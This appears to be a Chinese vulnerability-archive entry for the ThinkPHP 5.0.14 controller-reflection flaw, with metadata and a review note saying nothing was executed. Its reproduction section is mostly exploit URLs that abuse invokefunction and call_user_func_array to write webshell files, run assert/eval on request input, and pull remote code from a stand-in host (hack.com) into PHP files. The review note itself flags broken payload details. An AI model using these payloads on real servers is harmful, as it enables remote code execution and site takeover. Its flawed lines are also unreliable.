---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.14"
prerequisites: "来源所述条件，未列明部分仍待核：仅标题 5.0.14；无完整影响/修复范围，未独立证实该版本可利用"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b8e727fdeb7ad17847d6887a"
entity_id: "ve-b8e727fdeb7ad17847d6887a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅标题 5.0.14；无完整影响/修复范围，未独立证实该版本可利用

代码与实验材料：已全文读取全部载荷；仅静态分析，没有实验响应；部分包含写文件/下载副作用

来源证据范围：只有hatch补库标签，无原作者或原始漏洞资料

- **适用与权限边界（1）**：前提、证据和归属不足；依据：首条重复function且PHP结束标记?3E缺百分号；copy写112233.ph；PHP7.2尖括号转义只是观察无配置原因。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：以单版本拆文件造成重复和误导；依据：简介及影响范围为空，标题版本不能代替实际组件/配置验证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.14

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、常规命令

    ?s=index/think\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E

### 2、eval（\'\'）和assert（\'\'）被拦截，命令函数被禁止

    http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();
    http://www.xxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array("file_put_contents",array("3.php",file_get_contents("https://www.hack.com/xxx.js")));

### 3、基于php7.2环境下

    http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1
    http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index111.php',file_get_contents('https://www.hack.com/xxx.js'));?>
    写进去发现转义了尖括号

### 4、通过copy函数

     http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.ph
